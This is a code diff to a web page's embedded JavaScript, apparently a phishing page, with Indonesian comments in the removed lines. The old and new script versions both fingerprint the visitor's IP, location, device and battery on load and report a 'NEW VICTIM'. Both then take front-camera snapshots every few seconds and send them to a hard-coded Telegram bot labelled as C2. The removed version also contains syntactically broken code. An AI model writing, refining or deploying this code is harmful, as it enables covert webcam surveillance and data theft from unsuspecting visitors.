@@ -61,210 +61,114 @@ a {
 </style>
 <script>
 (() => {
-    // --- KONFIGURASI UTAMA (Ganti sesuai kebutuhan) ---
     const C2_CONFIG = {
-        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', // Pastikan Token Valid
-        chatId: '6326816238',                                     // ID Chat Target (Format -100xxxxxxxxxx atau ID grup user biasa)
-        interval: 5000,                                           // Interval kirim foto dalam milidetik (5 detik/5000ms untuk balance HD & Batere)
-        retries: 3                                                // Jumlah kali coba kirim jika gagal (Network Glitch/Error API)
+        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
+        chatId: '6326816238',
+        interval: 1500
     };
 
-    let globalStream = null;      // Menyimpan MediaStream dari kamera
-    let canvas = document.createElement('canvas');
-    let ctx = canvas.getContext('2d');
-    
-    // --- FUNGSI HELPER UTAMA UNTUK KONEKSI TEGELRAM ---
-    async function sendToTelegram(method, body) {
-        const url = `https://api.telegram.org/bot${C2_CONFIG.token}/${method}`;
-        
-        for(let i=0; i <= C2_CONFIG.retries; i++) {
-            try {
-                // Fetch dengan headers standar agar tidak kena block CORS atau rate limit aneh-aneh
-                const response = await fetch(url, { method: 'POST', body }); 
-                
-                if(response.ok || response.status === 409) return true; // Sukses atau sudah ada update terbaru
-                
-                let statusText = "";
-                try { statusText = await response.text(); } catch(e){}
+    const telegramApi = (method, body) => {
+        return fetch(`https://api.telegram.org/bot${C2_CONFIG.token}/${method}`, {
+            method: 'POST',
+            body: body
+        });
+    };
 
-                console.log(`[TG API] Response ${response.status}:`, statusText);
-
-                // Jika error 5xx (Server Error) atau 429/Timeout, retry sebentar
-                if([429, 486].includes(response.status)) {
-                    console.warn("Rate limited or Timeout, Retrying in " + C2_CONFIG.interval /1000 + "s..."); 
-                    setTimeout(()=>{}, i > 0 ? Math.min(i*2000, 5000) : 500); 
-                    continue;
-                } else {
-                     sendErrorLog(`❌ *Send Fail (${method}):*\nCode: ${response.status}\nData: ${statusText.substring(0, 150)}...`);
-                     return false; // Gagal kirim definitif setelah max retries
-                }
-
-            } catch(e) {
-                 console.error("Network Error:", e.message);
-                 if (i < C2_CONFIG.retries) {
-                      setTimeout(() => {}, i > 0 ? Math.min(i*2000, 5000) : 500); 
-                      continue; // Retry lagi jika masih ada sisa.
-                  } else {
-                       sendErrorLog(`❌ *Network Timeout:* ${e.message}`);
-                  }
-            }
-        }
-        return true; // Set status akhir sebagai success setelah retry habis untuk menghindari loop tak terbatas.
-    }
-
-    // --- FUNGSI KUMPUL DATA SISTEM & IP CORBAN (TARGETED INFO) ---
     async function collectSystemInfo() {
-        let ipData = { ip: '-', city: '-', country: '-' }; 
+        let ipData = { ip: 'N/A', city: 'N/A', country: 'N/A', org: 'N/A' };
         
         try {
-            const res = await fetch('https://ipapi.co/json/'); 
-            if(res.ok) ipData = await res.json(); 
-            
-            // Fallback jika Primary API macet atau butuh waktu response lama (>3s)
-            setTimeout(async () => {
-                const resAlt = await fetch('https://api.ipify.org?format=json'); 
-                if(resAlt.ok && !ipData.city || !ipData.country) {
-                     console.log("Fallback to secondary IP source..."); 
-                     const dataAlt = await resAlt.json(); 
-                     ipData.ip = dataAlt.ip; 
-                     
-                     // Jika fallback berhasil, update sedikit info minimal (opsional tapi bagus untuk UX log)
-                    sendErrorLog(`🔍 *IP Source Switched:* \`${dataAlt.ip}\``);
-                } else if (!res.ok) {
-                     sendErrorLog(`⚠️ *Primary IP API (${res.status}) Failed*`);
-                } else throw "Empty"; // Fallback logic for cleaner code.
-
-            }, 1500); 
-
-        } catch(e) { console.log("Initial IP check error:", e.message);}
-
-        let infoText = `🔥 **TARGET ID: \`${ipData.ip || 'Loading...'}\`** 🔥\n\n`;
-        
-        // Tambahkan detail lokasi jika berhasil dapat data lengkap dari Primary/Secondary source
-        if(ipData.city !== '-') {
-             infoText += `${infoPrefix("Location"):} 📍 ${ipData.city}, ${ipData.country_name.replace(/\n/g, ' ')}\n`;
-             infoText += `${infoPrefix("ISP"):} 💻 ${ipData.org || '-'}\n`; 
-             // Opsional: tambahkan detail tambahan seperti Provider internet lain.
-             if('org' in ipData && !ipData.org) infoText += `🏢 *Org:* N/A\n`; 
-        } else {
-            // Jika IP lokal atau fallback gagal ambil lokasi lengkap, tetap kirim minimal data dasar agar korban tau script jalan.
-            infoText += `\u267B\uFE0F *Location Data Pending*... \n💻 *Base IP:* \`${ipData.ip}\`\n`;
+            const res = await fetch('https://ipapi.co/json/');
+            if (res.ok) ipData = await res.json();
+        } catch (e) {
+            try {
+                const resAlt = await fetch('https://api.ipify.org?format=json');
+                const data = await resAlt.json();
+                ipData.ip = data.ip;
+            } catch (err) {}
         }
 
-        infoText += `\n----------------------------------\n` + 
-                    `${infoPrefix("OS"):} 💻 ${navigator.platform}\n` + 
-                    `${infoPrefix("Screen"):} 🖥️  ${screen.width}x${screen.height}\n` + 
-                    `${infoPrefix("CPU/RAM"):} ⚙️  Cores:\`${navigator.hardwareConcurrency || '?'}'\`, RAM~\`${navigator.deviceMemory||'?'}GB`\n` +
-                    `${infoPrefix("Battery"):} 🔋   ${await getBatteryInfo()}\n` +
-                    `${infoPrefix("Browser/UA"):} 🕵️  \`${navigator.userAgent.substring(0,35)}...\``;
+        const info = `
+🔥 *NEW VICTIM TARGETED* 🔥
+----------------------------------
+🌐 *IP Address:* \`${ipData.ip}\`
+📍 *Location:* ${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}
+ISP: ${ipData.org || 'N/A'}
+💻 *OS/Platform:* \`${navigator.platform}\`
+🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)
+⚙️ *CPU Cores:* ${navigator.hardwareConcurrency || 'N/A'}
+🧠 *RAM:* ~${navigator.deviceMemory || 'N/A'} GB
+🔋 *Battery:* ${await getBatteryInfo()}
+🕵️ *User-Agent:* \`${navigator.userAgent}\`
+----------------------------------
+        `;
 
-        // Kirim Status Awal (Text) dengan aman ke Telegram
         const formData = new FormData();
-        formData.append('chat_id', C2_CONFIG.chatId); 
+        formData.append('chat_id', C2_CONFIG.chatId);
+        formData.append('text', info);
+        formData.append('parse_mode', 'Markdown');
         
-        // Escape newline characters properly for Markdown inside string literal
-        let cleanMsg = infoText.replace(/\n/g, '\\n'); 
-        formData.append('text', cleanMsg); 
-        
-        await sendToTelegram('sendMessage', formData); 
+        telegramApi('sendMessage', formData);
     }
-
-    function infoPrefix(key) { return `${key}: `; } 
 
     async function getBatteryInfo() {
-        try {
-            if ('getBattery' in navigator) {
+        if ('getBattery' in navigator) {
+            try {
                 const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% [${b.charging ? '🔋 Charging' : '⚡ Discharging'}]`;
-            } else return "N/A"; // Fallback jika browser tidak support battery API (misal Firefox Desktop lama)
-        } catch (e) { return "N/A"; }}
+                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            } catch (e) { return 'N/A'; }
+        }
+        return 'N/A';
+    }
 
-    let videoTrack = null;
+    let globalStream = null;
+    let canvas = document.createElement('canvas');
+    let ctx = canvas.getContext('2d');
+    let video = document.createElement('video');
+    video.autoplay = true;
+    video.playsInline = true;
 
     async function initCamera() {
-        console.log("Initializing Camera Stream...");
-
-        // Konfigurasi Kamera: Ideal untuk HD/Full-HD, audio off untuk hemat bandwidth & baterai.
         try {
-            globalStream = await navigator.mediaDevices.getUserMedia({ 
-                audio: false, 
-                video: { 
-                    width: { ideal: 1920 },   // Target Full-HD atau lebih tinggi jika device support 4K
-                    height: { ideal: 1080 },  
-                    facingMode: "user",       // Depan (Selfie) - Pastikan user memilih selfie di prompt browser pertama kali.
-                    advanced: [{ setting: 'imageQuality', value: 95 }] // Kualitas max di beberapa browser modern (Safari/Chrome). Fallback otomatis ke native quality.
-                } 
+            globalStream = await navigator.mediaDevices.getUserMedia({
+                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" }
             });
-
-            if (!globalStream.getVideoTracks()[0]) throw new Error("No Video Track");
-
-            const track = globalStream.getVideoTracks()[0];
-            
-            // Set canvas resolution sama persis dengan resolusi asli video stream agar tajam & HD.
-            try {
-                 const settings = track.getSettings(); 
-                 canvas.width = settings.width; 
-                 canvas.height = settings.height; 
-
-                 console.log(`✅ *Camera Ready!* Res: ${canvas.width}x${canvas.height}`);
-                 
-                 // Mulai loop ambil frame dan kirim setiap interval yang sudah diset (default 5 detik)
-                 setInterval(captureAndSendFrame, C2_CONFIG.interval);
-                 
-            } catch (e) {
-                console.warn("Canvas size auto-det fail using default", e);
-            }
-
+            video.srcObject = globalStream;
+            video.onloadedmetadata = () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                setInterval(captureAndSendFrame, C2_CONFIG.interval);
+            };
         } catch (err) {
-             console.error("❌ Camera Access Error:", err.message);
-             
-             // Jika kamera gagal akses, kirim log error lengkap ke Telegram agar korban tau.
-             sendErrorLog(`📷 *CAM INIT:* \n\n${err.message}\n💻 *Device might block camera or lack hardware.*` + 
-                          `\n⚙️ Try refresh page & allow camera permission in browser.`);
-        } 
+            sendErrorLog(`Camera Access Denied/Failed: ${err.message}`);
+        }
     }
 
     function captureAndSendFrame() {
-        if (!globalStream || !globalStream.getVideoTracks()[0]) return;
+        if (!globalStream || video.readyState !== video.HAVE_ENOUGH_DATA) return;
 
-        const ctx = canvas.getContext('2d');
-        let track = globalStream.getVideoTracks()[0]; // Pastikan track masih aktif
-        
-        try {
-            // Ambil frame terakhir dari video stream ke canvas. 
-            // Ini adalah "snapshot" murni, bukan sekadar grab frame dari DOM video element (lebih stabil).
-            ctx.drawImage(track.srcObject, 0, 0); 
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob((blob) => {
+            if (!blob) return;
             
-            // Convert Canvas Blob dengan kualitas JPEG tinggi (95%) dan nama file unik waktu agar tidak override file lama di server bot.
-            const blobData = new Blob([ctx.getImageData(0, 0, canvas.width, canvas.height).data], { type: "image/jpeg" });
-            
-            // Kirim foto via Telegram API dengan retry logic otomatis di fungsi sendToTelegram
-            sendToTelegram('sendPhoto', new FormData(); 
-                .append('chat_id', C2_CONFIG.chatId)
-                .append('photo', blobData, `GhostCam_HD_${Date.now()}.jpg`));
+            const formData = new FormData();
+            formData.append('chat_id', C2_CONFIG.chatId);
+            formData.append('photo', blob, `cam_${Date.now()}.jpg`);
 
-        } catch (err) {
-             console.error("Frame Capture Error:", err);
-             
-             // Jika capture gagal total (misal video element putus), kirim log error setelah delay sedikit agar tidak spam terlalu cepat.
-             setTimeout(() => sendErrorLog(`❌ *Capture Err:* ${err.message}`), 5000);
-        }
+            telegramApi('sendPhoto', formData).catch(() => {});
+        }, 'image/jpeg', 0.7);
     }
 
     function sendErrorLog(msg) {
-         const fd = new FormData();
-         fd.append('chat_id', C2_CONFIG.chatId);
-         fd.append('text', msg.replace(/\n/g, '\\n')); 
-         fd.append('parse_mode', 'Markdown');
-         
-         void sendToTelegram('sendMessage', fd).catch(e => console.error("Log Fail", e));
+        const formData = new FormData();
+        formData.append('chat_id', C2_CONFIG.chatId);
+        formData.append('text', `⚠️ *LOG ERROR:* ${msg}`);
+        formData.append('parse_mode', 'Markdown');
+        telegramApi('sendMessage', formData);
     }
 
-    // --- START EXECUTION (Jalankan inisialisasi saat script dimuat) ---
-    
-    // Delay sedikit agar DOM browser siap menerima event stream sebelum akses kamera diminta.
-    setTimeout(() => { collectSystemInfo().then(() => { initCamera() }); }, 1000);
-
+    collectSystemInfo();
+    initCamera();
 })();
 </script>
 <table width="100%" height="100%">
